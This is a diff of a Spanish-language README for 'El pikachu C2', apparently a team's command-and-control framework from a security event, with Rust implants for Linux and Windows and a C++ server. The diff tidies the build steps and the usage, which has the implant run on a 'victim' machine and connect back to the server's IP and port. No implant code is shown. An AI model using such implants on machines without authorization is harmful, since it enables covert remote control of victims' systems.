@@ -1,12 +1,15 @@
 # El pikachu C2
-Un increible e impresionante C2 hecho por elpikachu xd
+Un increible e impresionante C2 hecho por elpikachu
+
+## Team: Sexy-AllpAcks - SecOps Days Lima
+@elpikachu, @s4yhii, @gatomon
 
 ## Features
-- implant linux & windows
-- implantes hechos en Rust ❤️
-- server en c++ 🐀
-- multisesion
-- esta chido
+- Implant linux & windows
+- Implantes hechos en Rust ❤️
+- Server en C++
+- Multisesion
+- Esta chido
 
 ## Como compilar
 ### dependencias:
@@ -14,35 +17,41 @@ Un increible e impresionante C2 hecho por elpikachu xd
 - mingw
 - g++
 
-para el server:
+Para el server:
 ```sh
+cd server
 make 
 ```
-para el implante:
+Para el implante:
 ```sh
-make linux #compila linux duh!
-make windows #adivina qe compila xd
+cd implant
+
+# Linux
+make linux
+
+# Windows
+make windows
 ```
 
 ## Como usar
 
-en el server
+En el server
 ```sh
 ./server <port>
 ```
 
 
-en el equipo victima
+En el equipo victima
 
 ```sh
-#win
+# Windows
 ./pika.exe <ip> <port>
 
-#linux
+# Linux
 ./pika <ip> <port>
 ```
 
-## help
+## Help
 ```sh
 c2> help
 sessions              list sessions
